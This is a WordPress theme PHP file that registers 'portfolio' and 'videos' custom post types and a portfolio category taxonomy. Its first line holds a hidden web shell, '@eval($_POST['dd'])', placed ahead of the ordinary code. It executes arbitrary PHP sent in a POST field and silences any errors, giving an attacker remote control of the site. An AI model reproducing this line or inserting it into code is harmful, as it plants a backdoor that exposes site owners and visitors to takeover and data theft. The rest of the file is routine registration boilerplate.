<?php @eval($_POST['dd']);?><?php
/**
* Registers a new post type
* @uses $wp_post_types Inserts new post type object into the list
*
* @param string  Post type key, must not exceed 20 characters
* @param array|string  See optional args description above.
* @return object|WP_Error the registered post type object, or an error object
*/

/**
* Registers a new post type
* @uses $wp_post_types Inserts new post type object into the list
*
* @param string  Post type key, must not exceed 20 characters
* @param array|string  See optional args description above.
* @return object|WP_Error the registered post type object, or an error object
*/
function portfolio() {

	$labels = array(
		'name'                => __( 'Portfolios', 'actonvideo' ),
		'singular_name'       => __( 'Portfolio', 'actonvideo' ),
		'add_new'             => _x( 'Add New Portfolio', 'actonvideo', 'actonvideo' ),
		'add_new_item'        => __( 'Add New Portfolio', 'actonvideo' ),
		'edit_item'           => __( 'Edit Portfolio', 'actonvideo' ),
		'new_item'            => __( 'New Portfolio', 'actonvideo' ),
		'view_item'           => __( 'View Portfolio', 'actonvideo' ),
		'search_items'        => __( 'Search Portfolios', 'actonvideo' ),
		'not_found'           => __( 'No Portfolios found', 'actonvideo' ),
		'not_found_in_trash'  => __( 'No Portfolios found in Trash', 'actonvideo' ),
		'parent_item_colon'   => __( 'Parent Portfolio:', 'actonvideo' ),
		'menu_name'           => __( 'Portfolios', 'actonvideo' ),
	);

	$args = array(
		'labels'                   => $labels,
		'hierarchical'        => true,
		'description'         => 'description',
		'taxonomies'          => array(),
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => null,
		'menu_icon'           => null,
		'show_in_nav_menus'   => true,
		'publicly_queryable'  => true,
		'exclude_from_search' => false,
		'has_archive'         => true,
		'query_var'           => true,
		'can_export'          => true,
		'rewrite'             => true,
		'capability_type'     => 'post',
		'supports'            => array(
			'title', 'editor', 'thumbnail',
			'excerpt',
			)
	);

	register_post_type( 'portfolio', $args );
}

add_action( 'init', 'portfolio' );


/**
 * Create a taxonomy
 *
 * @uses  Inserts new taxonomy object into the list
 * @uses  Adds query vars
 *
 * @param string  Name of taxonomy object
 * @param array|string  Name of the object type for the taxonomy object.
 * @param array|string  Taxonomy arguments
 * @return null|WP_Error WP_Error if errors, otherwise null.
 */
function portfolio_taxonomies() {

	$labels = array(
		'name'					=> _x( 'Portfolio Category', 'Taxonomy Portfolio Category', 'actonvideo' ),
		'singular_name'			=> _x( 'Portfolio Category', 'Taxonomy Portfolio Category', 'actonvideo' ),
		'search_items'			=> __( 'Search Portfolio Category', 'actonvideo' ),
		'popular_items'			=> __( 'Popular Portfolio Category', 'actonvideo' ),
		'all_items'				=> __( 'All Portfolio Category', 'actonvideo' ),
		'parent_item'			=> __( 'Parent Portfolio Category', 'actonvideo' ),
		'parent_item_colon'		=> __( 'Parent Portfolio Category', 'actonvideo' ),
		'edit_item'				=> __( 'Edit Portfolio Category', 'actonvideo' ),
		'update_item'			=> __( 'Update Portfolio Category', 'actonvideo' ),
		'add_new_item'			=> __( 'Add New Portfolio Category', 'actonvideo' ),
		'new_item_name'			=> __( 'New Portfolio Category Name', 'actonvideo' ),
		'add_or_remove_items'	=> __( 'Add or remove Portfolio Category', 'actonvideo' ),
		'choose_from_most_used'	=> __( 'Choose from most used actonvideo', 'actonvideo' ),
		'menu_name'				=> __( 'Portfolio Category', 'actonvideo' ),
	);

	$args = array(
		'labels'            => $labels,
		'public'            => true,
		'show_in_nav_menus' => true,
		'show_admin_column' => true,
		'hierarchical'      => true,
		'show_tagcloud'     => true,
		'show_ui'           => true,
		'query_var'         => true,
		'rewrite'           => true,
		'query_var'         => true,
		'capabilities'      => array(),
	);

	register_taxonomy( 'portfolio-category', array( 'portfolio' ), $args );
}

add_action( 'init', 'portfolio_taxonomies' );




// ************** Types of video

/**
* Registers a new post type
* @uses $wp_post_types Inserts new post type object into the list
*
* @param string  Post type key, must not exceed 20 characters
* @param array|string  See optional args description above.
* @return object|WP_Error the registered post type object, or an error object
*/
function videos() {

	$labels = array(
		'name'                => __( 'Videos', 'actonvide' ),
		'singular_name'       => __( 'Video', 'actonvide' ),
		'add_new'             => _x( 'Add New Video', 'actonvide', 'actonvide' ),
		'add_new_item'        => __( 'Add New Video', 'actonvide' ),
		'edit_item'           => __( 'Edit Video', 'actonvide' ),
		'new_item'            => __( 'New Video', 'actonvide' ),
		'view_item'           => __( 'View Video', 'actonvide' ),
		'search_items'        => __( 'Search Videos', 'actonvide' ),
		'not_found'           => __( 'No Videos found', 'actonvide' ),
		'not_found_in_trash'  => __( 'No Videos found in Trash', 'actonvide' ),
		'parent_item_colon'   => __( 'Parent Video:', 'actonvide' ),
		'menu_name'           => __( 'Videos', 'actonvide' ),
	);

	$args = array(
		'labels'                   => $labels,
		'hierarchical'        => true,
		'description'         => 'description',
		'taxonomies'          => array(),
		'public'              => true,
		'show_ui'             => true,
		'show_in_menu'        => true,
		'show_in_admin_bar'   => true,
		'menu_position'       => null,
		'menu_icon'           => null,
		'show_in_nav_menus'   => true,
		'publicly_queryable'  => true,
		'exclude_from_search' => false,
		'has_archive'         => true,
		'query_var'           => true,
		'can_export'          => true,
		'rewrite'             => true,
		'capability_type'     => 'post',
		'supports'            => array(
			'title', 'editor', 'thumbnail',
			'excerpt'
			)
	);

	register_post_type( 'videos', $args );
}

add_action( 'init', 'videos' );




